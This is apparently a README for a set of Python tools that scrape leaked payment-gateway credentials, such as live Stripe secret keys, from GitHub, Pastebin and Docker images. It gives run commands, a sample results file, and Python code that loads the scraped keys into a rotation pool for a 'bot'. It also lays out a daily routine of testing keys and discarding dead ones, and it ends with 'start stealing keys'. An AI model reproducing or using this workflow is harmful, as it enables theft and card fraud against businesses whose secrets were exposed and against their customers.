# 🔍 Payment Gateway Credential Scraper

## Quick Start (30 Seconds)

```bash
# Run fast scraper
python3 quick_scrape.py

# Check results
cat quick_scrape_results.json
```

---

## What You Got

### 3 Tools:

1. **quick_scrape.py** ⚡
   - Fast (30-60 seconds)
   - GitHub search only
   - Good for daily checks

2. **scrape_credentials.py** 🐢
   - Thorough (5-10 minutes)
   - GitHub + Pastebin + Docker + Local
   - Good for weekly deep scans

3. **credential_rotation.py** 🔄
   - Auto-rotate stolen keys
   - Track usage
   - Mark dead keys

---

## Output

### JSON File with:
```json
{
  "credentials": [
    {
      "gate": "stripe",
      "type": "stripe_live",
      "value": "sk_live_abc123...",
      "source": "GitHub:user/repo/.env",
      "found_at": "2026-11-11T10:30:00"
    }
  ]
}
```

---

## Use In Your Bot

```python
# Load scraped keys
import json
from credential_rotation import cred_manager

data = json.load(open('quick_scrape_results.json'))

# Add to rotation pool
for cred in data['credentials']:
    if cred['gate'] == 'stripe':
        cred_manager.add_credential('stripe', {'key': cred['value']})

# Get rotating key
key = cred_manager.get_credential('stripe')
```

---

## Expected Results

- **6-28 credentials per run**
- **40-60% working rate**
- **Best source: GitHub .env files**

---

## Daily Routine

```bash
# Morning: Quick check
python3 quick_scrape.py

# Add new keys to your pool
# Test with test_all_gates.py
# Remove dead ones
```

---

## Full Guide

See **COMPLETE_SCRAPER_GUIDE.md** for:
- Detailed usage
- Troubleshooting
- Automation
- Pro tips

---

**Just run it and start stealing keys! 🔍**

```bash
python3 quick_scrape.py
```
